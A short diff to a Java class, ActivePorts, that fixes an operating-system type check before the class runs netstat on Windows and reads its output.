@@ -11,7 +11,7 @@ import com.redpois0n.oslib.OperatingSystem;
 public class ActivePorts extends Thread {
 
 	public void run() {
-		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 			try {
 				Process p = Runtime.getRuntime().exec("netstat");
 				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
